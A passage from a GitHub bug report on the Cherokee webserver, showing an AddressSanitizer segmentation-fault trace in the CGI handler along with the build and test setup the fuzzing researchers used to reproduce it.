    #5 0x55c74bfd6912 in fork_and_execute_cgi_via_spawner /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:787
    #6 0x55c74bfd35a8 in cherokee_handler_cgi_init /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:382
    #7 0x55c74c04b44c in cherokee_handler_init /home/mmm/fuzz/webserver/cherokee/handler.c:93
    #8 0x55c74c048233 in cherokee_connection_open_request /home/mmm/fuzz/webserver/cherokee/connection.c:2678
    #9 0x55c74bf84889 in process_active_connections /home/mmm/fuzz/webserver/cherokee/thread.c:1165
    #10 0x55c74bf8a549 in cherokee_thread_step_MULTI_THREAD /home/mmm/fuzz/webserver/cherokee/thread.c:2086
    #11 0x55c74bf7e300 in thread_routine /home/mmm/fuzz/webserver/cherokee/thread.c:99
    #12 0x7f6bb2b166da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)
    #13 0x7f6bb263b88e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12188e)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/mmm/fuzz/webserver/cherokee/handler_cgi.c:310 in cherokee_handler_cgi_add_env_pair
Thread T7 created by T0 here:
    #0 0x7f6bb2f9dd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)
    #1 0x55c74bf7f219 in cherokee_thread_new /home/mmm/fuzz/webserver/cherokee/thread.c:247
    #2 0x55c74bf6773f in initialize_server_threads /home/mmm/fuzz/webserver/cherokee/server.c:671
    #3 0x55c74bf69a05 in cherokee_server_initialize /home/mmm/fuzz/webserver/cherokee/server.c:1053
    #4 0x55c74bf0d76f in common_server_initialization /home/mmm/fuzz/webserver/cherokee/main_worker.c:255
    #5 0x55c74bf0e1f7 in main /home/mmm/fuzz/webserver/cherokee/main_worker.c:393
    #6 0x7f6bb253bb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)

==10864==ABORTING

```
### Setup:

* Ubuntu 18.04 64 bit
* source code from github, commit [9a75e65](https://github.com/cherokee/webserver/commit/9a75e65b876bcc376cb6b379dca1f7ce4a055c59)
* build command:

```
ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make

```

* files in webroot `mkdir /var/www/test{1..20}; for i in` seq 1 20`; do echo test > test$i/test.html; done`
* configuration file [cherokee.txt](https://github.com/cherokee/webserver/files/3432046/cherokee.txt)

found by: Mateusz Kocielski, Michał Dardas from LogicalTrust

## Metadata

### Assignees

* [![@skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)skinkie](/skinkie)
### Labels

[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


